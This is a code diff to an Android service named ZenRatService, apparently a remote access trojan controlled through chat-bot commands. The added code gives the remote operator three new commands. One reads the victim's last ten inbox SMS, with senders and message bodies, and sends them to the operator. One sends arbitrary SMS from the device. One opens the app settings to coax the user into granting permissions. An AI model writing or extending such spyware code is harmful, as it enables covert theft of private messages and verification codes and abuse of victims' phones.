@@ -2,7 +2,12 @@ package com.zenrat.client.core
 
 import android.app.Service
 import android.content.Intent
+import android.annotation.SuppressLint
+import android.net.Uri
 import android.os.IBinder
+import android.provider.Settings
+import android.provider.Telephony
+import android.telephony.SmsManager
 import android.util.Log
 import io.ktor.client.*
 import io.ktor.client.call.*
@@ -105,7 +110,74 @@ class ZenRatService : Service() {
                 val deviceInfo = getDeviceInfo()
                 sendMessage(message.chat.id, deviceInfo)
             }
+            "/permissions" -> {
+                openAppSettings()
+                sendMessage(message.chat.id, "Opening app settings to grant permissions.")
+            }
+            "/getsms" -> {
+                val smsList = getSmsMessages()
+                sendMessage(message.chat.id, smsList)
+            }
+            message.text.startsWith("/sendsms") -> {
+                val parts = message.text.split(" ", limit = 3)
+                if (parts.size == 3) {
+                    val phoneNumber = parts[1]
+                    val smsText = parts[2]
+                    val result = sendSms(phoneNumber, smsText)
+                    sendMessage(message.chat.id, result)
+                } else {
+                    sendMessage(message.chat.id, "Invalid format. Use: /sendsms <phoneNumber> <message>")
+                }
+            }
         }
+    }
+
+    private fun sendSms(phoneNumber: String, message: String): String {
+        return try {
+            val smsManager = this.getSystemService(SmsManager::class.java)
+            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
+            "SMS sent to $phoneNumber."
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending SMS", e)
+            "Error sending SMS. Have you granted SEND_SMS permission?"
+        }
+    }
+
+    @SuppressLint("Recycle") // The cursor is closed by the `use` block.
+    private fun getSmsMessages(): String {
+        val smsList = StringBuilder("--- INBOX (Last 10) ---\n\n")
+        try {
+            val cursor = contentResolver.query(
+                Telephony.Sms.Inbox.CONTENT_URI,
+                arrayOf(Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.DATE),
+                null,
+                null,
+                "${Telephony.Sms.Inbox.DATE} DESC LIMIT 10"
+            )
+
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS))
+                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY))
+                        smsList.append("From: $address\nMessage: $body\n---\n")
+                    } while (it.moveToNext())
+                } else {
+                    smsList.append("No SMS found in inbox.")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error reading SMS", e)
+            return "Error reading SMS. Have you granted READ_SMS permission?"
+        }
+        return smsList.toString()
+    }
+
+    private fun openAppSettings() {
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+        intent.data = Uri.fromParts("package", packageName, null)
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(intent)
     }
 
     private fun getDeviceInfo(): String {
